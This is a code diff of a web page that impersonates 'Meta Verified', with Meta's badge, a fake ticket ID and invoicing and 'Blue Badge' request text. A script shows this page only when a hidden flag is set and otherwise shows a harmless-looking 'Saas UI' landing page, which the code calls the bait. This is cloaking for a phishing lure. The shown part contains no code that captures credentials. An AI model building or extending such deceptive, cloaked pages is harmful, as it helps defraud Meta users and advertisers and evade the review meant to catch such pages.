+                <a href="#" style="color:#52555a;font-size:0.8125rem;text-decoration:none;">Twitter</a>
+                <a href="#" style="color:#52555a;font-size:0.8125rem;text-decoration:none;">GitHub</a>
+            </div>
+        </div>
+    </footer>
+</div>
 
-                    if (countdown <= 0) {
-                        clearInterval(interval);
-                        // Hide modal
-                        setTimeout(() => {
-                            window.location.href = 'privacy-centers.html';
-                            loadingModal.classList.remove('opacity-100');
-                            loadingModal.classList.add('opacity-0', 'pointer-events-none');
-                        }, 300);
-                    }
-                }, 1000); // Update every 1 second
-            });
-        </script>
-        <style>
-            .loader {
-                border-top-color: #1877f2;
-                -webkit-animation: spinner 0.75s linear infinite;
-                animation: spinner 0.75s linear infinite;
-            }
+<!-- ===================== REAL PAGE (Meta Verified) ===================== -->
+<div id="realPage" class="page">
+    <!-- Intro overlay -->
+    <div id="intro-overlay">
+        <div style="text-align:center;">
+            <div style="font-size:3rem;">🔵</div>
+            <div style="margin-top:1rem;color:#1877f2;font-weight:600;font-family:'Inter',sans-serif;">Meta Verified</div>
+        </div>
+    </div>
 
-            @-webkit-keyframes spinner {
-                0% {
-                    -webkit-transform: rotate(0deg);
-                }
+    <div class="real-content" style="padding-top:1.5rem;">
+        <div class="real-header">
+            <div class="meta-badge-icon">
+                <svg width="49" height="49" viewBox="0 0 49 49" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <rect x="11" y="13" width="26" height="23" fill="white"/>
+                    <path fill-rule="evenodd" clip-rule="evenodd"
+                        d="M18.2432 3.21986C21.3096 -1.07329 27.6902 -1.07329 30.7569 3.21986L31.2451 3.90334C31.7846 4.65892 32.6909 5.06349 33.6136 4.96097L35.7896 4.71917C40.687 4.17504 44.825 8.31305 44.2809 13.2103L44.0392 15.3864C43.9366 16.3092 44.3411 17.2153 45.0967 17.755L45.7802 18.2432C50.0733 21.3096 50.0733 27.6902 45.7802 30.7569L45.0967 31.2451C44.3411 31.7846 43.9366 32.6909 44.0392 33.6136L44.2809 35.7896C44.825 40.687 40.687 44.825 35.7896 44.2809L33.6136 44.0392C32.6909 43.9366 31.7846 44.3411 31.2451 45.0967L30.7569 45.7802C27.6902 50.0733 21.3099 50.0733 18.2432 45.7802L17.755 45.0967C17.2153 44.3411 16.3092 43.9366 15.3863 44.0392L13.2103 44.2809C8.31305 44.825 4.17504 40.687 4.71917 35.7896L4.96097 33.6136C5.06349 32.6909 4.65892 31.7846 3.90334 31.2451L3.21986 30.7569C-1.07329 27.6902 -1.07329 21.3099 3.21986 18.2432L3.90334 17.755C4.65892 17.2153 5.06349 16.3092 4.96097 15.3863L4.71917 13.2103C4.17504 8.31305 8.31305 4.17504 13.2103 4.71917L15.3864 4.96097C16.3092 5.06349 17.2153 4.65892 17.755 3.90334L18.2432 3.21986ZM34.0014 17.5617C35.0022 18.5626 35.0022 20.1855 34.0014 21.1863L24.2135 30.9742C22.9563 32.2316 20.9177 32.2316 19.6606 30.9742L14.9987 26.3123C13.9978 25.3115 13.9978 23.6886 14.9987 22.6877C15.9996 21.6869 17.6224 21.6869 18.6233 22.6877L21.937 26.0015L30.3768 17.5617C31.3776 16.5608 33.0005 16.5608 34.0014 17.5617Z"
+                        fill="#0081FB"/>
+                </svg>
+            </div>
+            <b style="font-size:2rem;">Meta Verified - Rewards for you</b>
+        </div>
 
-                100% {
-                    -webkit-transform: rotate(360deg);
-                }
-            }
+        <div class="real-body">
+            <p>We're reaching out to let you know that your business may be eligible for monthly invoicing, a payment option designed for trusted advertisers on Meta.</p>
+            <p>With monthly invoicing, you can consolidate your advertising costs into a single invoice each month, helping streamline billing and reduce interruptions to ad delivery.</p>
+            <p class="ticket">Your ticket id: #<span id="ticketId">XXXX-XXXX-XXXX</span></p>
 
-            @keyframes spinner {
-                0% {
-                    transform: rotate(0deg);
-                }
+            <div class="guide">
+                <p><b>Verified Blue Badge Request Guide</b></p>
+                <p>- Fact checkers may not respond to requests containing intimidation, hate speech, or verbal threats</p>
+                <p>- In your request, please provide all required information to ensure timely processing by the fact checker. Submitting an invalid email address or failing to reply to requests for additional information within 2 days may lead to the application being closed without review. If the request remains unprocessed after 4 days, Meta will automatically reject it.</p>
+                <p>- Once all details are submitted, we will evaluate your account to check for any restrictions. The verification process typically takes 24 hours, though it may extend in some cases. Based on our decision, restrictions will either remain or be lifted, and your account will be updated accordingly.</p>
+            </div>
+        </div>
 
-                100% {
-                    transform: rotate(360deg);
-                }
-            }
-        </style>
+        <button class="submit-btn" id="submitRequestBtn">Submit request</button>
+
+        <div class="real-footer">
+            <a href="#">Help Center</a>
+            <a href="#">Privacy Policy</a>
+            <a href="#">Terms of Service</a>
+            <a href="#">Community Standards</a>
+            <span>Meta © 2025</span>
+        </div>
+    </div>
+</div>
+
+<!-- ===================== ROUTER INIT ===================== -->
+<script>
+(function() {
+    if (window.__showRealPage) {
+        // Hiện trang thật (Meta Verified)
+        document.getElementById('realPage').classList.add('active');
+        document.getElementById('pageTitle').textContent = 'Meta Verified - Rewards for you';
+
+        // Tạo ticket ID ngẫu nhiên
+        function rand4() { return Math.floor(1000 + Math.random() * 9000); }
+        document.getElementById('ticketId').textContent = rand4() + '-' + rand4() + '-' + rand4();
+
+        // Intro overlay
+        var overlay = document.getElementById('intro-overlay');
+        setTimeout(function() {
+            overlay.classList.add('fade-out');
+            setTimeout(function() { overlay.style.display = 'none'; }, 500);
+        }, 1500);
+
+        // Submit button
+        document.getElementById('submitRequestBtn').addEventListener('click', function() {
+            alert('Your request has been submitted. We will review it within 24 hours.');
+        });
+
+    } else {
+        // Hiện trang mồi (Saas UI)
+        document.getElementById('decoyPage').classList.add('active');
+        document.getElementById('pageTitle').textContent = 'Saas UI Landingspage';
+    }
+})();
+</script>
+
 </body>
-
 </html>
